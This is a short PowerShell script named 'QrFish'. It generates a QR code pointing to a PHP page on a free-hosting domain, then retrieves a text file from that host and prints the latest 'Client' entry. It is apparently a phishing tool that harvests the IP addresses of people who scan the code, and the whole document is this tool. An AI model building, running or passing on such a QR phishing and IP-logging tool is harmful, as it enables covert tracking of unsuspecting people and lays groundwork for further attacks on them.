Write-Host "QrFish"
$namef = Read-Host "Name File QR (.png) ? "
Invoke-WebRequest -Uri "https://qr-code.ir/api/qr-code/?d=http://mrbanana2024.000.pe/test.php" -OutFile "$namef"
Write-Host "save file $namef"
$text = Read-Host "show IPs (Y/N) ? "
if ($text -eq "Y"){
    $uri = Invoke-WebRequest -Uri "http://mrbanana2024.000.pe/qr.txt"
    $sh = $uri.Content -split "`n"
    write-host "Client : " + $sh[-1]
    Read-Host "Enter (TheEnd) ..."
} else {
    exit
}
